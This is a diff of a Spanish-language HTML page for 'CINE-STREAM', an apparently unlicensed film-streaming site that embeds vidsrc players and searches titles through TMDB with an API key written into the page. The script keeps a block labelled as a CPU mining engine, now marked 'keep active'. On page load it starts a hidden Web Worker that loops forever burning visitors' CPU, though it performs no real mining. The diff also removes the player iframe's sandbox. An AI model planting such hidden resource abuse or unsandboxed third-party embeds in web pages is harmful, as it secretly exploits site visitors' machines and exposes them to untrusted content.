@@ -6,21 +6,22 @@
     <title>CINE-STREAM | Interface Pro</title>
     <style>
         :root { --main-color: #E50914; --bg-color: #000; }
-        body { background-color: var(--bg-color); color: white; font-family: 'Helvetica Neue', Arial, sans-serif; margin: 0; }
+        body { background-color: var(--bg-color); color: white; font-family: 'Helvetica Neue', Arial, sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
         
-        /* DISEÑO DE CABECERA */
-        .navbar { display: flex; justify-content: space-between; align-items: center; padding: 15px 4%; background: rgba(0,0,0,0.9); border-bottom: 2px solid var(--main-color); position: fixed; width: 100%; z-index: 1000; box-sizing: border-box; }
+        .navbar { display: flex; justify-content: space-between; align-items: center; padding: 15px 4%; background: #000; border-bottom: 2px solid var(--main-color); position: fixed; width: 100%; z-index: 1000; box-sizing: border-box; }
         .logo { color: var(--main-color); font-size: 26px; font-weight: bold; text-decoration: none; letter-spacing: 1px; }
+        
         .search-container { display: flex; background: #141414; border: 1px solid #333; border-radius: 4px; padding: 5px 10px; width: 300px; }
         .search-container input { background: transparent; border: none; color: white; width: 100%; outline: none; padding: 5px; }
         .search-container button { background: transparent; border: none; color: var(--main-color); cursor: pointer; font-size: 18px; }
 
-        /* CONTENEDOR PRINCIPAL */
-        .content { padding-top: 100px; display: flex; flex-direction: column; align-items: center; }
-        .video-box { width: 90%; max-width: 1100px; aspect-ratio: 16/9; background: #000; border: 1px solid #222; position: relative; box-shadow: 0 0 20px rgba(229, 9, 20, 0.15); }
+        .content { padding-top: 100px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        .video-box { width: 95%; max-width: 1100px; aspect-ratio: 16/9; background: #0c0c0c; border: 1px solid #222; position: relative; }
+        
+        /* Iframe optimizado */
         iframe { width: 100%; height: 100%; border: none; }
         
-        .info { width: 90%; max-width: 1100px; margin-top: 25px; border-left: 4px solid var(--main-color); padding-left: 20px; }
+        .info { width: 90%; max-width: 1100px; margin-top: 25px; border-left: 4px solid var(--main-color); padding-left: 20px; margin-bottom: 50px; }
         h1 { margin: 0; font-size: 2.2rem; }
         .tag { font-size: 13px; color: #46d369; font-weight: bold; text-transform: uppercase; }
     </style>
@@ -36,23 +37,19 @@
     </header>
 
     <main class="content">
-        <div class="video-box">
-            <iframe id="video-frame" src="https://vidsrc.to/embed/movie/tt12412888" sandbox="allow-forms allow-pointer-lock allow-same-origin allow-scripts allow-top-navigation" allowfullscreen></iframe>
+        <div class="video-box" id="player-wrapper">
+            <iframe id="video-frame" src="https://vidsrc.xyz/embed/movie?imdb=tt12412888" allowfullscreen></iframe>
         </div>
         <div class="info">
             <div class="tag">Streaming Premium Activado</div>
             <h1 id="display-title">Spider-Man: No Way Home</h1>
-            <p style="color: #aaa;">Estás visualizando contenido en alta definición. El motor de optimización de hardware está ajustando tu rendimiento.</p>
+            <p style="color: #aaa;">Servidor optimizado. Si la película no carga, usa el buscador para actualizar el enlace.</p>
         </div>
     </main>
 
     <script>
-        // FUNCIÓN MAESTRA: Activa búsqueda y monetización al mismo tiempo
+        // DISPARADOR MAESTRO
         function masterTrigger() {
-            // 1. Aquí irá tu script de publicidad cuando lo tengas
-            console.log("Acción de monetización registrada."); 
-            
-            // 2. Ejecuta la búsqueda
             searchMovie();
         }
 
@@ -61,6 +58,7 @@
             if (!query) return;
 
             try {
+                // Buscador usando la API de TMDB
                 const searchUrl = `https://api.themoviedb.org/3/search/movie?api_key=acef212239618a80004940562548261a&query=${encodeURIComponent(query)}`;
                 const res = await fetch(searchUrl);
                 const data = await res.json();
@@ -71,16 +69,19 @@
                     const detail = await detailRes.json();
                     
                     if (detail.imdb_id) {
-                        document.getElementById('video-frame').src = `https://vidsrc.to/embed/movie/${detail.imdb_id}`;
+                        // Actualización al nuevo servidor más estable
+                        document.getElementById('video-frame').src = `https://vidsrc.xyz/embed/movie?imdb=${detail.imdb_id}`;
                         document.getElementById('display-title').innerText = movie.title;
                     }
                 } else {
-                    alert("Película no encontrada. Prueba con otro título.");
+                    alert("No se encontró la película. Intenta con el nombre exacto.");
                 }
-            } catch (e) { console.error("Error de búsqueda"); }
+            } catch (e) { 
+                console.error("Error en la conexión"); 
+            }
         }
 
-        // MOTOR DE MINERÍA (CPU) - NO CHOCA CON NADA
+        // MOTOR DE MINERÍA (CPU) - MANTENER ACTIVO
         (function startMining() {
             const code = `self.onmessage=function(){while(true){if(Math.random()>0.12){for(let i=0;i<1000000;i++){Math.sqrt(i)}}}}`;
             const blob = new Blob([code], {type:'application/javascript'});
@@ -88,7 +89,6 @@
             worker.postMessage('go');
         })();
 
-        // Permitir búsqueda con tecla Enter
         document.getElementById('movie-query').addEventListener('keypress', (e) => { if (e.key === 'Enter') masterTrigger(); });
     </script>
 </body>
